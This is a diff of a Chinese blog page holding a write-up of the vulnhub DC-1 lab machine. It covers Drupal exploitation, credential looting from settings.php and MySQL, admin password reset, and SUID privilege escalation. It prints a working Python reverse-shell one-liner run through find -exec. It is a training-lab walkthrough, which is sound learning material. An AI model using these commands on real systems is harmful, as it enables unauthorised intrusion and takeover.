@@ -16,7 +16,7 @@
 
 
 
-<title>Archives | Blacknight</title>
+<title>vulnhub——DC系列 | Blacknight</title>
 
 
 
@@ -303,107 +303,233 @@
     }
 </script>
         <div class="main">
-            <div class="post-wrap archive">
+            <div class="container">
     
     
-        
-
-        
-            <h3>2020</h3>
-        
-
-        <article class="archive-item">
-            <a class="archive-item-link" href="/2020/06/02/Phar/">Phar以及phar对象注入</a>
-            <span class="archive-item-date">June 2, 2020</span>
-        </article>
-    
-        
-
-        
-
-        <article class="archive-item">
-            <a class="archive-item-link" href="/2020/06/01/buu9%E2%80%94%E2%80%94%5BBJDCTF2020%5DMark%20loves%20cat/">BJDCTF2020——Mark_loves_cat</a>
-            <span class="archive-item-date">June 1, 2020</span>
-        </article>
-    
-        
-
-        
-
-        <article class="archive-item">
-            <a class="archive-item-link" href="/2020/05/31/buu7%E2%80%94%E2%80%94%5Bwangdingbei%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5DAreUSerialz/">网鼎杯2020青龙组——AreUSerialz</a>
-            <span class="archive-item-date">May 31, 2020</span>
-        </article>
-    
-        
-
-        
-
-        <article class="archive-item">
-            <a class="archive-item-link" href="/2020/05/31/buu8%E2%80%94%E2%80%94%5Banxunbei%202019%5Deasy_web/">安洵杯2019——easy_web</a>
-            <span class="archive-item-date">May 31, 2020</span>
-        </article>
-    
-        
-
-        
-
-        <article class="archive-item">
-            <a class="archive-item-link" href="/2020/05/30/buu6%E2%80%94%E2%80%94%5BGXYCTF2019%5D%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/">GXYCTF2019——禁止套娃</a>
-            <span class="archive-item-date">May 30, 2020</span>
-        </article>
-    
-        
-
-        
-
-        <article class="archive-item">
-            <a class="archive-item-link" href="/2020/05/29/buu5%E2%80%94%E2%80%94%5B0CTF%202016%5Dpiapiapia/">0CTF2016——piapiapia</a>
-            <span class="archive-item-date">May 29, 2020</span>
-        </article>
-    
-        
-
-        
-
-        <article class="archive-item">
-            <a class="archive-item-link" href="/2020/05/28/buu4%E2%80%94%E2%80%94%5BZJCTF%202019%5DNiZhuanSiWei/">ZJCTF2019——NiZhuanSiWei</a>
-            <span class="archive-item-date">May 28, 2020</span>
-        </article>
-    
-        
-
-        
-
-        <article class="archive-item">
-            <a class="archive-item-link" href="/2020/05/27/buu3%E2%80%94%E2%80%94%5Bwangdingbei%202018%5DFakebook/">网鼎杯2018——Fakebook</a>
-            <span class="archive-item-date">May 27, 2020</span>
-        </article>
-    
-        
-
-        
-
-        <article class="archive-item">
-            <a class="archive-item-link" href="/2020/05/26/buu2%E2%80%94%E2%80%94%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DPHP/">极客大挑战2019——PHP</a>
-            <span class="archive-item-date">May 26, 2020</span>
-        </article>
-    
-        
-
-        
-
-        <article class="archive-item">
-            <a class="archive-item-link" href="/2020/05/26/note13/">PHP中的public、protected、private</a>
-            <span class="archive-item-date">May 26, 2020</span>
-        </article>
-    
-    
-    <nav class="pagination">
-        <a class="page-number" href="/archives/">1</a><span class="space">&hellip;</span><a class="page-number" href="/archives/page/3/">3</a><a class="page-number" href="/archives/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/archives/page/6/">6</a><a class="page-number" href="/archives/page/7/">7</a>
-    </nav>
-
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
 </div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">vulnhub——DC系列</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">banbird</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">October 9, 2020&nbsp;&nbsp;23:30:00</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/vulnhub/">vulnhub</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>扫描端口服务</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010160958.png" alt=""></p>
+<p>发现开启了111端口，搜集一波信息，找到一篇<a href="https://www.aqniu.com/threat-alert/24769.html" target="_blank" rel="noopener">文章</a>，可以对服务器ddos从而使其崩溃，这里我们大概没啥用</p>
+<p>访问网站，得知web框架是drupal</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010164321.png" alt=""></p>
+<p>百度下有挺多getshell教程，msf搜索下有没有集成相关漏洞</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010185012.png" alt=""></p>
+<h3 id="获取会话"><a href="#获取会话" class="headerlink" title="获取会话"></a>获取会话</h3><p>挨个试，试到第五个成功获取session</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010190300.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010190354.png" alt=""></p>
+<p>python建立交互式shell，在当前目录下找到flag1，并且下一步提示在配置文件里</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010190640.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010190844.png" alt=""></p>
+<p>在站点的default目录下找到了一个settings.php，查看后得到数据库用户名和密码以及下一步的提示</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010192213.png" alt=""></p>
+<h3 id="获取网站用户名和密码"><a href="#获取网站用户名和密码" class="headerlink" title="获取网站用户名和密码"></a>获取网站用户名和密码</h3><p>尝试登录mysql</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010192720.png" alt=""></p>
+<p>drupaldb库里有张user表，在里面找到用户名以及hash处理后的密码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010192839.png" alt=""></p>
+<p>试着john和hashcat解密，解不开，后来搜到一篇<a href="https://www.itread01.com/p/1150641.html" target="_blank" rel="noopener">文章</a>说可以重置密码，重置下即可</p>
+<p>首先使用密码生成脚本生成新密码的hash</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010194936.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010200544.png" alt=""></p>
+<p>拿到hash在mysql中手动更新一下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010200938.png" alt=""></p>
+<p>但我这里因为超过失败次数账号被锁了，那么按照文章中说的，情况flood表即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">truncate table flood</span><br></pre></td></tr></table></figure>
+
+<h3 id="管理员登录"><a href="#管理员登录" class="headerlink" title="管理员登录"></a>管理员登录</h3><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010202038.png" alt=""></p>
+<p>在dashboard里找到flag3</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010202158.png" alt=""></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>根目录下发现home目录下有flag4文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010202518.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010202837.png" alt=""></p>
+<p>提示我们要提权，我们查看下系统内核</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010203513.png" alt=""></p>
+<p>本来想到脏牛，但靶机没有安装gcc环境，那么试下SUID提权</p>
+<p>首先查找拥有SUID权限的文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010203959.png" alt=""></p>
+<p>我们可以看到文件是具有root权限的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010204258.png" alt=""></p>
+<p>随便找一个文件借用其权限执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;bin&#x2F;find flag1.txt -exec whoami \;			#这里的文件必须是能找到的</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010204952.png" alt=""></p>
+<p>在kali上新开一个终端nc监听端口，靶机建立一个python开启一个连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;bin&#x2F;find &#x2F;var&#x2F;www&#x2F;flag1.txt -exec python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.126.128&quot;,3122));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39; \;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010205605.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010205622.png" alt=""></p>
+<p>find命令找到flag文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010205846.png" alt=""></p>
+<p>读取flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010205930.png" alt=""></p>
+<p>完成</p>
+<h2 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h2>
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>banbird</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://www.blacknight.top/2020/10/09/vulnhub_DC/">http://www.blacknight.top/2020/10/09/vulnhub_DC/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2020 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2020/10/07/vulnhub_me_and_my_girlfriend/">vulnhub——me_and_my_girlfriend</a>
+            
+        </section>
+
+    <section id="comments" class="comments">
+      <style>
+        .comments{margin:30px;padding:10px;background:#fff}
+        @media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#fff}}
+      </style>
+      <div class="valine_comment"></div>
+<!--载入js，在</body>之前插入即可-->
+<!--Leancloud 操作库:-->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<!--Valine 的核心代码库-->
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+      el: '.valine_comment',
+      app_id: '8biphXJF0NRr0Xnr2pEPIjYa-gzGzoHsz',
+      app_key: '0RbmT7aNG8nj44MHrGMt9JFk',
+      placeholder: '这里留言。。',
+      notify: 'true',
+      verify: 'true',
+    });
+</script>
+    </section>
+
+
+    </article>
+</div>
+
         </div>
         <footer id="footer" class="footer">
     <div class="copyright">
